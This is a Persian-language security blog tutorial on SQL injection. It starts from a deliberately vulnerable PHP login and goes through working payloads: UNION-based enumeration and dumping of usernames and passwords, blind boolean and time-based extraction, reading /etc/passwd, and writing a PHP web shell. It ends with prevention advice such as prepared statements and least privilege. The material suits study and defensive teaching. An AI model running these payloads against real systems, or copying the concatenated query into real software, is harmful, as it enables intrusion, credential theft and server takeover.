---
title: "از CTF تا دنیای واقعی: شیرجه عمیق به تزریق SQL"
description: "یاد بگیرید تزریق SQL چگونه کار می‌کند، چگونه آن را پیدا و بهره‌برداری کنید، و چگونه از آن در برنامه‌های مدرن جلوگیری کنید."
date: "2026-02-11"
slug: "sql-injection-deep-dive"
thumbnail: "/blog/thumbnails/sqli-thumbnail.png"
tags: ["تزریق SQL", "امنیت وب", "ctf", "دنیای واقعی", "تست نفوذ"]
lang: "fa"
published: true
---

اگر تا به حال در یک مسابقه CTF شرکت کرده باشید، احتمالاً چالشی دیده‌اید که یک فرم ورود به شما می‌دهد و می‌گوید پرچم را بازیابی کنید. شما `' OR 1=1 --` را تایپ می‌کنید و ناگهان به عنوان ادمین وارد می‌شوید. آسان است، نه؟ اما در برنامه‌های واقعی، تزریق SQL به ندرت اینقدر سرراست است. سیستم‌های تولیدی لایه‌های دفاعی، محدودیت‌های کاراکتری و منطق پیچیده‌ای دارند که یک `' OR 1=1` ساده را به یک حمله کورِ دقیقاً طراحی‌شده تبدیل می‌کند.

این مقاله پل بین تزریق SQL به سبک CTF و چالش‌هایی است که در باگ‌بانتی‌ها و تست‌های نفوذ با آن روبرو می‌شوید. بررسی می‌کنیم که تزریق SQL چگونه واقعاً رخ می‌دهد، چگونه انواع مختلف آن را به طور سیستماتیک بهره‌برداری کنید و مهم‌تر از همه، چگونه برنامه‌هایی بسازید که در برابر آن مصون باشند.

## تزریق SQL چیست؟

تزریق SQL یک تکنیک تزریق کد است که از آسیب‌پذیری در لایه پایگاه داده برنامه سوءاستفاده می‌کند. هنگامی که ورودی کاربر به‌درستی فیلتر نشود یا مستقیماً در کوئری‌های SQL ادغام شود، مهاجم می‌تواند کوئری مورد نظر را تغییر داده و دستورات SQL دلخواه را اجرا کند.

تأثیر آن می‌تواند از دور زدن احراز هویت تا تصاحب کامل سرور متغیر باشد.

## چگونه کار می‌کند: یک مثال حداقلی

یک اسکریپت ساده ورود به PHP را در نظر بگیرید:

```php {1-3,7}
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$conn = new mysqli("localhost", "user", "pass", "db");
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    // ورود موفق
}
?>
```

اگر مهاجم `admin' --` را به عنوان نام کاربری و هر چیزی را به عنوان رمز عبور ارسال کند، کوئری به این شکل تبدیل می‌شود:

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'
```

همه چیز بعد از `--` کامنت می‌شود. بررسی رمز عبور حذف می‌شود و مهاجم به عنوان `admin` وارد می‌شود.

این همان «کلاسیک CTF» است. اما اگر برنامه از `addslashes()` استفاده کند، یا یک WAF داشته باشد، یا کاربر پایگاه داده مجوز `FILE` نداشته باشد، چه؟ بهره‌برداری در دنیای واقعی نیاز به درک عمیق‌تری دارد.

## انواع تزریق SQL

تزریق SQL به طور کلی به سه دسته تقسیم می‌شود که هر کدام رویکرد بهره‌برداری متفاوتی نیاز دارند.

### درون‌خطی (Union‑based / Error‑based)

مهاجم نتیجه کوئری تزریق‌شده را مستقیماً در پاسخ برنامه دریافت می‌کند. این ساده‌ترین نوع برای بهره‌برداری است.

**Union‑based** – از عملگر `UNION` برای اضافه کردن یک `SELECT` اضافی و بازیابی داده استفاده می‌کند.

**Error‑based** – پایگاه داده را مجبور به تولید پیام خطایی می‌کند که حاوی داده مورد نظر است (مثلاً `CONVERT(int, @@version)`).

### استنتاجی (کور)

هیچ خطا یا داده‌ای به طور مستقیم بازگردانده نمی‌شود. مهاجم با مشاهده تفاوت در رفتار برنامه اطلاعات را استنباط می‌کند.

**Boolean‑based** – پیلودهایی ارسال می‌کند که باعث می‌شود کوئری `true` یا `false` برگرداند و می‌بیند آیا محتوای صفحه تغییر می‌کند.

**Time‑based** – از دستوراتی مانند `SLEEP(5)` استفاده می‌کند و زمان پاسخ را اندازه می‌گیرد.

### خارج از باند

داده از طریق کانالی دیگر، مثلاً درخواست‌های DNS یا HTTP به سرور تحت کنترل مهاجم، انتقال می‌یابد. اغلب زمانی استفاده می‌شود که کانال پاسخ در دسترس نباشد.

## بهره‌برداری گام‌به‌گام

بیایید یک سناریوی واقعی را مرور کنیم: صفحه جستجویی که محصولات را از پایگاه داده نمایش می‌دهد. آدرس این است: `https://example.com/products?category=Gifts`.

### ۱. تشخیص آسیب‌پذیری

یک نقل قول تکی (`'`) را در پارامتر وارد کنید. اگر سرور خطا برگرداند یا صفحه رفتار عجیبی داشت، تزریق SQL ممکن است.

### ۲. تعیین تعداد ستون‌ها (Union)

از `ORDER BY` یا `UNION SELECT` استفاده کنید:

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
...
```

وقتی `ORDER BY 5` خطا می‌دهد، می‌دانید که ۴ ستون وجود دارد.

یا با `UNION SELECT` و nullها:

```sql
' UNION SELECT NULL,NULL,NULL-- -
```

### ۳. پیدا کردن ستون‌های خروجی

`NULL` را با مقادیر تست جایگزین کنید تا ببینید کدام ستون در صفحه منعکس می‌شود:

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
...
```

### ۴. استخراج اطلاعات پایگاه داده

وقتی ستونی دارید که داده را چاپ می‌کند، شمارش را شروع کنید:

**نسخه**  
```sql
' UNION SELECT @@version,NULL,NULL-- -
```

**پایگاه داده فعلی**  
```sql
' UNION SELECT database(),NULL,NULL-- -
```

**جدول‌ها (MySQL)**  
```sql
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
```

**ستون‌ها**  
```sql
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

**داده‌ها**  
```sql
' UNION SELECT username,password,NULL FROM users-- -
```

### ۵. تزریق SQL کور (Blind)

وقتی چیزی چاپ نمی‌شود، باید به true/false یا تأخیر زمانی تکیه کنید.

**مثال Boolean** – تست کنید که نام پایگاه داده با 'a' شروع می‌شود:

```sql
' AND SUBSTRING(database(),1,1)='a'-- -
```

اگر صفحه به‌طور عادی برگردد (true)، می‌فهمید کاراکتر اول 'a' است.

**مثال Time‑based** (MySQL):

```sql
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 0)-- -
```

با اندازه‌گیری تأخیر، می‌توانید داده را بیت‌به‌بیت استخراج کنید.

### ۶. پیشرفته: خواندن/نوشتن فایل‌ها

اگر کاربر پایگاه داده مجوز `FILE` داشته باشد و `secure_file_priv` تنظیم نشده باشد، می‌توانید فایل‌های سیستمی را بخوانید:

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -
```

یا یک وب‌شل بنویسید:

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL,NULL INTO OUTFILE "/var/www/html/shell.php"-- -
```

در محیط تولید، چنین مجوزهایی تقریباً هرگز داده نمی‌شود، اما گاهی در CTF‌ها و سرورهای بدتنظیم دیده می‌شوند.

## از CTF تا دنیای واقعی

در چالش‌های CTF، معمولاً پارامتر آسیب‌پذیر آشکار است، کاربر پایگاه داده `root` است و WAF وجود ندارد. برنامه‌های واقعی متفاوتند:

- **WAF / IDS** – کلمات کلیدی آشکار مانند `UNION`، `SELECT`، `SLEEP` را مسدود می‌کنند. باید یاد بگیرید پیلودها را مبهم‌سازی کنید (تغییر حروف بزرگ و کوچک، کامنت‌ها، انکدینگ‌های جایگزین).
- **فیلتر ورودی** – برخی برنامه‌ها نقل‌قول‌ها را حذف می‌کنند، بک‌اسلش‌ها را escape می‌کنند، یا قبل از ساخت کوئری از HTML‑encoding استفاده می‌کنند.
- **کوئری‌های پارامتری شده به هنجار تبدیل شده‌اند** – بسیاری از فریم‌ورک‌های مدرن (ORM، prepared statements) تزریق SQL را به طور ذاتی حذف می‌کنند. اما تزریق مرتبه دوم (second‑order) هنوز ممکن است رخنه کند.
- **رویه‌های ذخیره‌شده** – اگر در داخل آنها از SQL پویا استفاده شود، ممکن است آسیب‌پذیر باشند.

ذهنیتی که در CTF‌ها پرورش می‌دهید – درک اینکه کوئری چگونه ساخته می‌شود و یافتن راهی برای شکستن آن – دقیقاً همان چیزی است که در دنیای واقعی نیاز دارید. فقط باید تکنیک‌های خود را با محدودیت‌های پیش رو تطبیق دهید.

## پیشگیری: چگونه برنامه‌های امن بسازیم

### ۱. پرپیرد استیتمنت‌ها (کوئری‌های پارامتری)

این **تنها** دفاع قابل اعتماد است. ساختار کوئری ثابت است و ورودی کاربر به عنوان پارامتر ارسال می‌شود، هرگز الحاق نمی‌شود.

**PHP (PDO)**  
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
$stmt->execute([$_POST['email']]);
```

**Python (sqlite3)**  
```python
cursor.execute("SELECT * FROM users WHERE email = ?", (email,))
```

### ۲. رویه‌های ذخیره‌شده

رویه‌های از پیش تعریف‌شده نیز می‌توانند پارامتری شوند. از SQL پویا در داخل رویه خودداری کنید.

### ۳. اعتبارسنجی ورودی با لیست سفید

اگر پارامتر باید عدد صحیح باشد، آن را به عدد تبدیل کنید. اگر باید یکی از چند مقدار خاص باشد، با لیست سفید بررسی کنید.

### ۴. Escaping

توابعی مانند `mysqli_real_escape_string()` در همه سناریوها **کافی نیستند** (مثلاً هنگام کار با encodingهای چندبایتی). به جای آنها از prepared statements استفاده کنید.

### ۵. کمترین امتیاز

کاربر پایگاه داده‌ای که برنامه استفاده می‌کند باید فقط مجوزهای لازم را داشته باشد (بدون `FILE`، بدون `DROP`، بدون `CREATE`).

## نتیجه‌گیری

تزریق SQL با وجود دو دهه شناخته‌شدگی، همچنان یکی از بحرانی‌ترین آسیب‌پذیری‌های وب است. CTF‌ها یک محیط آزمایشی عالی برای یادگیری مکانیک‌ها هستند، اما آزمون واقعی، به‌کارگیری آن دانش در برابر سیستم‌های مقاوم است. همیشه فرض کنید ورودی کاربر مخرب است و اجازه دهید موتور پایگاه داده جداسازی بین کد و داده را مدیریت کند.

حالا بروید و برخی کوئری‌ها را بشکنید – البته به صورت اخلاقی.